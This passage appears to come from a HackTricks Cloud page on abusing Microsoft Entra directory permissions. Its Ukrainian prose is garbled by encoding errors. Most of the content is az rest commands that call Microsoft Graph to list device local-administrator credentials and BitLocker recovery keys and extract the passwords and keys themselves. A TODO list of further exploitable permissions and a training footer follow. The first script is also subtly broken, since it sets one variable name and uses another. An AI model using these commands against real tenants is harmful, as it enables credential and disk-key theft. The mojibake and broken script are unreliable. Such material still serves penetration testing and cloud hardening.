–¶—è –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º —á–∏—Ç–∞—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ —Ä–µ–∑–µ—Ä–≤–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤, –ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö –¥–æ Microsoft Entra, –≤–∫–ª—é—á–∞—é—á–∏ –ø–∞—Ä–æ–ª—å

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

–¶—è –¥–æ–∑–≤–æ–ª—è—î –¥–æ—Å—Ç—É–ø –¥–æ –∫–ª—é—á—ñ–≤ BitLocker, —â–æ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –¥–∏—Å–∫–∏, —Å—Ç–∞–≤–ª—è—á–∏ –ø—ñ–¥ –∑–∞–≥—Ä–æ–∑—É –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—ñ—Å—Ç—å –¥–∞–Ω–∏—Ö.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## –Ü–Ω—à—ñ —Ü—ñ–∫–∞–≤—ñ –¥–æ–∑–≤–æ–ª–∏ (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
